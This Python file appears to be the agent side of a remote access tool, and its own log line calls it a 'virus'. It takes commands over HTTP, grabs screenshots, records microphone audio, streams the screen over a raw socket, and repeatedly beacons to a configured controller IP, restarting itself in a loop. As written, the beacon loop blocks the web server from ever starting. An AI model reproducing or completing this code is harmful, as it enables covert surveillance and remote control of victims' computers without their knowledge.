import PIL.Image
import utils as ut
import uvicorn
import asyncio
import PIL
import io
import socket
import math
import time
import requests
import json
from fastapi import FastAPI,Response
from runner import prosses_command
from threading import Thread
from config import VirConfig

app = FastAPI()

@app.post("/command")
async def receive_dict(data: dict): 
    try:
        answer = await prosses_command(data)
        if ("media_type" in answer.keys()):
            return Response(content=answer['content'],media_type=answer['media_type'])
        answer["valid"] = True
        if (not "message" in answer.keys()  ): answer["message"] = "run without crash"
        return answer
    except Exception as e:
        return {"valid":False,"message":str(e)}

@app.get("/screenshot")
async def get_screenshot(data: dict={}):
    try:
        monitor = data["monitor"] if ("monitor" in data.keys()) else 1
        pix = data["pix"] if ("pix" in data.keys()) else None
        img = ut.get_screenshot_async2(monitor,pix) 
        buffer = io.BytesIO()
        PIL.Image.fromarray(img).save(buffer,format='JPEG',quality=VirConfig['JpegQuality'])
        
        return Response(content=buffer.getvalue(),media_type="image/jpg")
    except Exception as e:
        return {"valid":False, "message":f"fail to take screenshot with error {e}"}

@app.get("/record")
async def get_recording(data: dict={}):
    try:
        t1 = time.perf_counter()
        der = data['time'] if 'time' in data.keys() else 1
        data = ut.record(der)
        print(f"wanter to record for {der} took {time.perf_counter() - t1}")
        return Response(content=data,media_type="audio/wav")
    except Exception as e:
        print(f"fail to record with error {e}")
        

def open_stream_port():
    port = VirConfig['StreamPort']
    host_ip = socket.gethostbyname(socket.gethostname())
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print(f"open stream port at {host_ip}:{port}")
    try:
        server_socket.bind((host_ip,port))
        server_socket.listen(5)
        client_socket, addr = server_socket.accept()
        while (True):
            print("wait")
            print(f"get connection from {addr}")
            img = ut.get_screenshot_async2(VirConfig['StreamMonitor'],VirConfig['ImagePixels']) 
            buffer = io.BytesIO()
            PIL.Image.fromarray(img).save(buffer,format='JPEG',quality=VirConfig['JpegQuality'])
            res = buffer.getvalue()
            print(f"data len is {len(res)}")
            message = bytes([(len(res) >> (8*i)) & 0xFF for i in range(4)]) + res
            client_socket.sendall(message)
    except Exception as e: print(f"FAIL AT OPEN_STREAM_PORT WITH {e}")
    finally:
        server_socket.close()
        print("close stream port")
        open_stream_port()

async def open_reporter(wait_time=5):
    while (True):
        if (len(VirConfig['ControllerIP']) != 0):
            try: requests.post(f"http://{VirConfig['ControllerIP']}:{VirConfig['RemoteLoggerPort']}",json=json.dumps({'message':'auto log'}))
            except Exception as e: print(f"open reporter fail with {e}")
        await asyncio.sleep(wait_time)

def start():
    ip,port = ut.get_ip(),8000 
    Thread(target=open_stream_port).start()
    asyncio.run(open_reporter())
    uvicorn.run(app,host=ip,port=port)
    print(f"start run virus at {ip}:{port}")
    

if (__name__ == "__main__"):
    print(ut.get_ip())
    while (True):
        start()
        print(f"fail at {time.time()}")